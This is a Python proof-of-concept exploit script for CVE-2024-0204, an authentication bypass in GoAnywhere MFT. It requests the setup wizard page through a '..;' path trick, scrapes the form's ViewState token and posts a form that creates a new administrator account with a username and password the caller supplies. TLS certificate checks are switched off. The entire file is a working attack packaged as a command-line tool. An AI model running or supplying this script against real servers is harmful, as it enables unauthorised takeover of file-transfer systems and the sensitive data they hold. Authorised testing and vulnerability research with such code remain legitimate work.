import requests
from bs4 import BeautifulSoup
import argparse

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def validate_password(password):
    if len(password) < 8:
        raise argparse.ArgumentTypeError("Password must be at least 8 characters long.")
    return password


def main():
    parser = argparse.ArgumentParser("CVE-2024-0204 GoAnywhere Authentication Bypass")
    parser.add_argument("endpoint", help="The endpoint URL (e.g., http://127.0.0.1:8080)")
    parser.add_argument("username", help="New admin username")
    parser.add_argument("password", help="New admin password", type=validate_password)
    args = parser.parse_args()
    url = f"{args.endpoint}/goanywhere/images/..;/wizard/InitialAccountSetup.xhtml"

    data = {
        "j_id_u:creteAdminGrid:username": args.username,
        "j_id_u:creteAdminGrid:password_hinput": args.password,
        "j_id_u:creteAdminGrid:password": "%E2%80%A2%E2%80%A2%E2%80%A2%E2%80%A2%E2%80%A2%E2%80%A2%E2%80%A2%E2%80%A2",
        "j_id_u:creteAdminGrid:confirmPassword_hinput": args.password,
        "j_id_u:creteAdminGrid:confirmPassword": "%E2%80%A2%E2%80%A2%E2%80%A2%E2%80%A2%E2%80%A2%E2%80%A2%E2%80%A2%E2%80%A2",
        "j_id_u:creteAdminGrid:submitButton": "",
        "createAdminForm_SUBMIT": 1,
    }

    s = requests.session()
    r = s.get(url, verify=False)
    if r.status_code == 401:
        raise Exception("Endpoint does not appear to be vulnerable.")

    soup = BeautifulSoup(r.text, "html.parser")
    input_field = soup.find('input', {'name': 'javax.faces.ViewState'})
    data['javax.faces.ViewState'] = input_field['value']
    r = s.post(url, verify=False, data=data)

    if r.status_code != 200:
        raise Exception("Failed to create new admin user")

    soup = BeautifulSoup(r.text, "html.parser")
    error_message = soup.find("span", {"class": "ui-messages-error-summary"})
    if error_message is not None:
        raise Exception(error_message.text)


if __name__ == "__main__":
    main()
